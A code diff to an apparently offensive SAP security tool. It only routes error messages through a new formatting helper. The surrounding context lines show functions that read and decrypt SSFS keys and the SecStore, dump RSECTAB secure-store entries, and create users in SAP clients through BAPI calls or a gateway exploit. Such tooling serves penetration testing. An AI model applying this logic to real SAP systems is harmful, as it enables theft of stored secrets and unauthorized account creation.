@@ -37,6 +37,7 @@ except ImportError:
 
 import sapmap_rfc
 from sapmap_models import Credentials, RFCConnection
+from sapmap_errors import format_rfc_exception
 
 # ---------------------------------------------------------------------------
 # Constants
@@ -423,19 +424,19 @@ def _read_ssfs_files_via_abap(node, creds) -> tuple:
                     key_bytes = base64.b64decode("".join(key_b64_parts))
                     print(f"[+] SSFS KEY: {len(key_bytes)} bytes read from OS")
                 except Exception as e:
-                    print(f"[-] SSFS KEY base64 decode failed: {e}")
+                    print(f"[-] SSFS KEY base64 decode failed: {format_rfc_exception(e)}")
 
             if dat_b64_parts:
                 try:
                     dat_bytes = base64.b64decode("".join(dat_b64_parts))
                     print(f"[+] SSFS DAT: {len(dat_bytes)} bytes read from OS")
                 except Exception as e:
-                    print(f"[-] SSFS DAT base64 decode failed: {e}")
+                    print(f"[-] SSFS DAT base64 decode failed: {format_rfc_exception(e)}")
 
             return key_bytes, dat_bytes
 
     except Exception as e:
-        print(f"[-] SSFS file read error: {e}")
+        print(f"[-] SSFS file read error: {format_rfc_exception(e)}")
         return None, None
 
 
@@ -865,7 +866,7 @@ def _find_open_clients(node, creds) -> list:
                 open_clients.append(mandt)
         return open_clients
     except Exception as e:
-        print(f"[-] {node.sid}: Could not read T000 for open clients: {e}")
+        print(f"[-] {node.sid}: Could not read T000 for open clients: {format_rfc_exception(e)}")
         return []
 
 
@@ -936,7 +937,7 @@ def _ensure_user_in_client(node, current_creds, target_client, state=None):
             return test_creds
     except Exception as e:
         print(f"[*] {node.sid}: BAPI user creation in client {target_client} "
-              f"failed: {e}")
+              f"failed: {format_rfc_exception(e)}")
 
     # 4. Try GW exploit (SQL INSERTs with explicit MANDT)
     if node.gw_vulnerable and state:
@@ -954,7 +955,7 @@ def _ensure_user_in_client(node, current_creds, target_client, state=None):
                 )
         except Exception as e:
             print(f"[*] {node.sid}: GW exploit user creation in client "
-                  f"{target_client} failed: {e}")
+                  f"{target_client} failed: {format_rfc_exception(e)}")
 
     print(f"[-] {node.sid}: Could not obtain access to client {target_client}")
     return None
@@ -1000,7 +1001,7 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
         try:
             ssfs_key = extract_ssfs_key(key_bytes)
         except Exception as e:
-            print(f"[-] SecStore {node.sid}: could not extract SSFS key: {e}")
+            print(f"[-] SecStore {node.sid}: could not extract SSFS key: {format_rfc_exception(e)}")
 
     # Parse SSFS DAT file — decrypt records with SSFS key, and look for
     # the RSECTAB individual key stored as SECSTORE_DB/KEY/...
@@ -1027,7 +1028,7 @@ def download_and_decrypt(node, creds, key_hex: str = DEFAULT_KEY_HEX,
                                 print(f"[+] SecStore {node.sid}: key differs from default")
                     break
         except Exception as e:
-            print(f"[-] SecStore {node.sid}: SSFS DAT parse error: {e}")
+            print(f"[-] SecStore {node.sid}: SSFS DAT parse error: {format_rfc_exception(e)}")
 
     # --- Step 2: Read RSECTAB (the actual secure store entries) ---
     print(f"[*] SecStore {node.sid}: reading RSECTAB entries...")
@@ -1176,7 +1177,7 @@ def _read_rsectab_via_abap(node, creds) -> list | None:
             return rows
 
     except Exception as e:
-        print(f"[-] SecStore ABAP read failed: {e}")
+        print(f"[-] SecStore ABAP read failed: {format_rfc_exception(e)}")
         return None
 
 
@@ -1195,7 +1196,7 @@ def _read_rsectab_via_rfc(node, creds) -> list | None:
             rows.append((ident, data_hex))
         return rows
     except Exception as e:
-        print(f"[-] SecStore RFC_READ_TABLE failed: {e}")
+        print(f"[-] SecStore RFC_READ_TABLE failed: {format_rfc_exception(e)}")
         return None
 
 
